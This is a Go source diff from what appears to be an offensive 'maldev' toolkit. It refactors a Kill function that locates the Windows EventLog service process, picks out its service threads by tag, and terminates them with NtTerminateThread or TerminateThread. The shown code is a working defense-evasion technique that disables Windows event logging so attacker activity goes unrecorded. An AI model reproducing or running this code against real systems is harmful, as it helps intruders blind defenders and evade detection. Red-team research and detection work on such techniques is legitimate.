@@ -9,32 +9,16 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/process/enum"
 	"github.com/oioio-space/maldev/win/api"
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
-
-// threadEntry32 matches THREADENTRY32 for CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD).
-// x/sys/windows does not expose ThreadEntry32, so we define it locally.
-type threadEntry32 struct {
-	Size           uint32
-	Usage          uint32
-	ThreadID       uint32
-	OwnerProcessID uint32
-	BasePri        int32
-	DeltaPri       int32
-	Flags          uint32
-}
 
 // threadQuerySetWin32StartAddress is the THREAD_INFORMATION_CLASS value
 // for NtQueryInformationThread that retrieves the thread's Win32 start
 // address. For svchost-hosted service threads, this also exposes the
 // SubProcessTag used for service tag resolution.
 const threadQuerySetWin32StartAddress = 9
-
-var (
-	procThread32First = api.Kernel32.NewProc("Thread32First")
-	procThread32Next  = api.Kernel32.NewProc("Thread32Next")
-)
 
 // tagQueryAvailable reports whether I_QueryTagInformation can be called.
 // Cached on first invocation.
@@ -133,49 +117,36 @@ func Kill(caller *wsyscall.Caller) error {
 		return fmt.Errorf("find EventLog PID: %w", err)
 	}
 
-	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	tids, err := enum.Threads(pid)
 	if err != nil {
-		return fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
-	}
-	defer windows.CloseHandle(snap)
-
-	var te threadEntry32
-	te.Size = uint32(unsafe.Sizeof(te))
-
-	r, _, err := procThread32First.Call(uintptr(snap), uintptr(unsafe.Pointer(&te)))
-	if r == 0 {
-		return fmt.Errorf("Thread32First: %w", err)
+		return fmt.Errorf("enumerate threads: %w", err)
 	}
 
 	killed := 0
-	for {
-		if te.OwnerProcessID == pid && isEventLogThread(pid, te.ThreadID) {
-			hThread, openErr := windows.OpenThread(windows.THREAD_TERMINATE, false, te.ThreadID)
-			if openErr == nil {
-				if caller != nil {
-					ret, _ := caller.Call("NtTerminateThread", uintptr(hThread), 0)
-					if ret == 0 {
-						killed++
-					}
-				} else {
-					r, _, _ = api.ProcTerminateThread.Call(uintptr(hThread), 0)
-					if r != 0 {
-						killed++
-					}
-				}
-				windows.CloseHandle(hThread)
+	for _, tid := range tids {
+		if !isEventLogThread(pid, tid) {
+			continue
+		}
+		hThread, openErr := windows.OpenThread(windows.THREAD_TERMINATE, false, tid)
+		if openErr != nil {
+			continue
+		}
+		if caller != nil {
+			ret, _ := caller.Call("NtTerminateThread", uintptr(hThread), 0)
+			if ret == 0 {
+				killed++
+			}
+		} else {
+			r, _, _ := api.ProcTerminateThread.Call(uintptr(hThread), 0)
+			if r != 0 {
+				killed++
 			}
 		}
-
-		te.Size = uint32(unsafe.Sizeof(te))
-		r, _, _ = procThread32Next.Call(uintptr(snap), uintptr(unsafe.Pointer(&te)))
-		if r == 0 {
-			break
-		}
+		windows.CloseHandle(hThread)
 	}
 
 	if killed == 0 {
-		return fmt.Errorf("no EventLog threads found for PID %d", pid)
+		return fmt.Errorf("no target threads found")
 	}
 	return nil
 }
